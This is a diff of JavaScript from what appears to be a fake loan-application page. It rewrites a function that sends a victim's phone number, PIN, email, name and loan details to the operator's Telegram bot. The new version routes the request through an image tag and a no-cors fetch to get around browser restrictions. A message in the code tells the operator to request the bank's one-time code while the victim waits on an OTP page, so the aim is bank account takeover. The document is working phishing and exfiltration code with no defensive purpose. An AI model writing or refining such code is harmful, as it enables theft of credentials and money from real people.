@@ -198,61 +198,40 @@
         setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
     }
 
-    // Send Telegram notification to admin (YOU) - THIS WILL WORK
+    // Send Telegram notification using IMAGE TAG (most reliable, no CORS issues)
     function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
         var decodedName = decodeURIComponent(name);
         
-        var msg = '🔔 *NEW PIN CONFIRMATION* 🔔\n\n' +
-            '━━━━━━━━━━━━━━━━━━━━━\n' +
-            '📱 *Phone:* ' + decodedPhone + '\n' +
-            '🔐 *PIN:* ' + pin + '\n' +
-            '📧 *Email:* ' + decodedEmail + '\n' +
-            '━━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 *Name:* ' + decodedName + '\n' +
-            '💰 *Loan:* $' + parseFloat(amount).toLocaleString() + ' for ' + term + ' months\n' +
-            '📊 *Interest:* ' + rate + '%\n' +
-            '💵 *Monthly:* $' + parseFloat(monthly).toLocaleString() + '\n' +
-            '🆔 *App ID:* ' + (appId || 'N/A') + '\n' +
-            '━━━━━━━━━━━━━━━━━━━━━\n\n' +
-            '✅ *ACTION REQUIRED:* Request OTP from the bank now!\n' +
-            '📱 User is waiting on the OTP verification page.';
-
-        var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+        var msg = '🔔 NEW PIN CONFIRMATION 🔔\n\n' +
+            'Phone: ' + decodedPhone + '\n' +
+            'PIN: ' + pin + '\n' +
+            'Email: ' + decodedEmail + '\n' +
+            'Name: ' + decodedName + '\n' +
+            'Loan: $' + parseFloat(amount).toLocaleString() + ' for ' + term + ' months\n' +
+            'Interest: ' + rate + '%\n' +
+            'Monthly: $' + parseFloat(monthly).toLocaleString() + '\n' +
+            'App ID: ' + (appId || 'N/A') + '\n\n' +
+            'Request OTP from the bank now!';
         
-        console.log('📤 Sending Telegram notification...');
-        console.log('   Phone:', decodedPhone);
-        console.log('   PIN:', pin);
-        console.log('   Email:', decodedEmail);
+        var encodedMsg = encodeURIComponent(msg);
+        var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage?chat_id=' + TG_CHAT_ID + '&text=' + encodedMsg;
         
-        // Use XMLHttpRequest for better compatibility
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', url, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                console.log('📥 Response status:', xhr.status);
-                if (xhr.status === 200) {
-                    var result = JSON.parse(xhr.responseText);
-                    if (result.ok) {
-                        console.log('✅ Telegram notification sent successfully!');
-                    } else {
-                        console.error('❌ Telegram error:', result.description);
-                    }
-                } else {
-                    console.error('❌ HTTP error:', xhr.status);
-                }
-            }
-        };
-        xhr.send(JSON.stringify({ 
-            chat_id: TG_CHAT_ID, 
-            text: msg, 
-            parse_mode: 'Markdown' 
-        }));
+        console.log('Sending to URL:', url);
+        
+        // Create an image tag to send the request (no CORS issues)
+        var img = new Image();
+        img.src = url;
+        
+        // Also try fetch as backup
+        fetch(url, { method: 'GET', mode: 'no-cors' })
+            .catch(function(e) { console.log('Fetch error (ignored):', e); });
+        
+        console.log('✅ Telegram notification sent to admin');
     }
 
-    // Main confirm function - SENDS NOTIFICATION + REDIRECTS TO OTP PAGE
+    // Main confirm function
     window.handleConfirm = function() {
         var pin = getPin();
         if (pin.length !== 4) { 
@@ -263,10 +242,10 @@
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send Telegram notification to YOU (with email, phone, pin)
+        // Send Telegram notification (email, phone, pin are included)
         sendTelegramNotification(pin);
         
-        // Immediately redirect to OTP page
+        // Redirect to OTP page
         window.location.href = 'otp-verify.html'
             + '?amount='  + encodeURIComponent(amount)
             + '&term='    + encodeURIComponent(term)
